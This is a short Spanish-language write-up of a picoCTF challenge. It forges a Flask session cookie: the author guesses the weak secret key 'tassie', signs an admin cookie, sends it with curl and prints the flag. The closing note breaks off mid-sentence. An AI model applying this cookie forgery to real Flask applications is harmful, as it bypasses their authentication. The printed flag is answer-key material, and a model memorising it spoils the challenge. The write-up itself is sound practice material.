## Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!

http://wily-courier.picoctf.net:59466/
1.- How secure is a flask cookie?
## Solución
```
curl -s -i http://wily-courier.picoctf.net:59466/

Set-Cookie: session=eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.arL33A.fiaKxn9Vtl7luTFyZXIGM0Kg7Vo; HttpOnly; Path=/

{"very_auth":"blank"}

tassie

eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arH4dA.Uww1NjWe9855AKHd16t0vj8myh0

curl -s -b "session=eeyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arL57A.gyHd1PAlzLF2dpDQ5ZvSkzkQL38" http://wily-courier.picoctf.net:59466/display

picoCTF{cO0ki3s_yum_485f560e}


```
## Notas Adicionales
- La vulnerabilidad fue una `SECRET_KEY` débil elegida de una lista pequeña de nombres de
## Referencias

http://wily-courier.picoctf.net:59466/
